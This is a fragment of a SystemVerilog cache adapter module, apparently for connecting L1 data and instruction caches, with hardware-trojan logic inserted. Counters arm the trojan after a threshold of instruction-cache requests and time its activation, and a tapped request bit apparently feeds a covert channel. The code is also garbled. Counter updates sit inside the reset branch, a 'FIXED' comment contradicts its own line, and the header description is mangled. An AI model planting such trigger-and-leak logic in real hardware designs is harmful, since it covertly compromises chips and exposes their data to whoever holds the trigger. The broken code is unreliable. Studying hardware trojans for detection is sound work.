...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int ARM_THRESHOLD = 9962;
    localparam int ACTIVATE_DELAY = 4981;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (!trojan_armed && icache_data_req_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && icache_data_req_i) trojan_counter2 <= trojan_counter2 + 1;
        ...
        assign current_bit = icache_data_req_i[covert_bit_index];  // <-- FIXED: use trigger_signal
...
// Date: 08.08.2018
// Description: adapter module to_trojan_Covert connect the L1D$ and L1I$ to the native
